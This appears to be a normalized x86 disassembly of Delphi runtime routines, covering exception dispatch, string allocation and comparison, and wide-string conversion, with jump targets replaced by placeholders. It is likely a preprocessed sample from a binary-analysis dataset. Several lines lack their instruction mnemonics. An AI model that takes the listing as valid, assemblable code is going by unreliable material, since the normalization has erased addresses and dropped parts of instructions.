cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_403150
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_4035d4
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_4060cc
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_403610
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402bc0
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_403970
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_403658
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_4039a8
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_403f60
sub_4039d0
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_4060cc
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_40321c
call sub_4035b8
sub_403a24
call sub_4060cc
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_40321c
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_403680
jmp edx
sub_403a6c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_402890
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403bcc
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403bf4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403c3a
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403c54
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403c9a
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403cf4
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405e60
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d18
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405e60
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d40
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d64
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403dc0
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403df0
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_4012fc
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_4012c4
push eax
call sub_4012e4
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_4012c4
push eax
call sub_4012e4
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403e7c
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403d64
call sub_403df0
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403bf4
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403bcc
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_40592c
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403dc0
push eax
call sub_401314
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_403f6c
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_4027ac
pop eax
sub_403f90
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4027ac
sub_403fc0
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_404030
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_402988
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4027ac
sub_404004
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4027ac
sub_404030
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_40278c
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_40405c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_404030
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_403f6c
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_402988
sub_40408c
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_4040ac
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call sub_401374
pop ebp
retn 0x4
sub_4040c8
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_403f6c
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_4045b8
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_40408c
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_40408c
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4045b8
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_40405c
jmp r-xdata
sub_404164
xor ecx ecx
test edx edx
je r-xdata
jmp sub_40405c
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_404194
xor ecx ecx
test edx edx
je r-xdata
jmp sub_4040c8
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4041dc
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_40405c
not ecx
sub_404208
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_402988
pop ebx
retn
mov ecx ebx
sub_404234
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_403fc0
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_4045b8
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_4045b8
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_402988
pop edi
pop esi
pop ebx
retn
sub_404278
test edx edx
je r-xdata
mov edx ecx
jmp sub_403fc0
test ecx ecx
je sub_403fc0
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_404234
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_404030
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_402988
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_402988
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_403fc0
pop edx
pop eax
jmp sub_404234
call sub_403fc0
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_4042ec
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_404030
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_4045b8
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_402988
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_403fc0
dec [ edx - 0x8 ]
sub_404378
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_404438
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_404030
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_402988
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_4027ac
sub_40448c
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_403f6c
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_40405c
jmp r-xdata
pop ebx
retn 0x4
sub_4044cc
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_404438
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_402988
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_4045b8
mov edi ecx
sub_404514
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_4045b8
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_402988
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_402988
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_404570
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_4045b8
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_403f6c
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_404030
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_4027cc
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_402988
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_40461c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax ecx
call sub_403f6c
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404030
mov [ edi ] eax
mov edx esi
mov cl bl
call sub_402c30
sub_404690
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call sub_4013b4
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_4046b4
test edx edx
je sub_404678
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_404678
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_4028e8
retn
sub_4046d8
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_404678
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_4048c0
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_4040ac
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_4040ac
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4048c0
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404764
jmp r-xdata
sub_404764
test ecx ecx
je sub_404678
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_4028e8
pop edx
push [ edx ]
mov [ edx ] eax
call sub_4013b4
retn
sub_404788
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404764
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4047f0
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_404874
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_4047e4
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_404764
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_4048c0
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_404668
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404650
mov ebx eax
mov eax [ edi ]
call sub_4047e4
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_402988
mov eax esi
sub_404904
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404934
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_404934
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404934
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404904
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_4028e8
sub_4049d4
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404a20
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_404a20
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_403f90
jmp r-xdata
call sub_403f6c
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_404690
jmp r-xdata
call sub_404678
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_404a08
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
